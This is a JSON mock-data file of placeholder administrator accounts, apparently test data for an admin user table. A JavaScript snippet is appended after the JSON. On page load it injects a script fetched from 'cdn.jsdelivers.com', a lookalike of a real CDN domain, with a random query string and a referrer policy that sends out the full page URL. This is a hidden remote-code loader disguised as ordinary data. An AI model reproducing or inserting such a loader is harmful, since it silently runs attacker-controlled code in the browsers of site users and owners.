{
  "code": 0
  ,"msg": ""
  ,"count": "100"
  ,"data": [{
    "id": "1001"
    ,"loginname": "admin"
    ,"telphone": "11111111111"
    ,"email": "111@qq.com"
    ,"role": "超级管理员"
    ,"jointime": "20150217"
    ,"audit": true
  },{
    "id": "1002"
    ,"loginname": "common-1"
    ,"telphone": "22222222222"
    ,"email": "222@qq.com"
    ,"role": "管理员"
    ,"jointime": "20160217"
    ,"audit": false
  },{
    "id": "1003"
    ,"loginname": "common-2"
    ,"telphone": "33333333333"
    ,"email": "333@qq.com"
    ,"role": "管理员"
    ,"jointime": "20161012"
    ,"audit": false
  },{
    "id": "1004"
    ,"loginname": "common-3"
    ,"telphone": "44444444444"
    ,"email": "444@qq.com"
    ,"role": "管理员"
    ,"jointime": "20170518"
    ,"audit": true
  },{
    "id": "1005"
    ,"loginname": "common-4"
    ,"telphone": "55555555555"
    ,"email": "555@qq.com"
    ,"role": "管理员"
    ,"jointime": "20180101"
    ,"audit": false
  },{
    "id": "1006"
    ,"loginname": "common-5"
    ,"telphone": "66666666666"
    ,"email": "666@qq.com"
    ,"role": "管理员"
    ,"jointime": "20160217"
    ,"audit": false
  },{
    "id": "1007"
    ,"loginname": "common-6"
    ,"telphone": "77777777777"
    ,"email": "777@qq.com"
    ,"role": "管理员"
    ,"jointime": "20161012"
    ,"audit": false
  },{
    "id": "1008"
    ,"loginname": "common-7"
    ,"telphone": "88888888888"
    ,"email": "888@qq.com"
    ,"role": "管理员"
    ,"jointime": "20170518"
    ,"audit": true
  },{
    "id": "1009"
    ,"loginname": "common-8"
    ,"telphone": "99999999999"
    ,"email": "999@qq.com"
    ,"role": "管理员"
    ,"jointime": "20180101"
    ,"audit": false
  }]
}

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}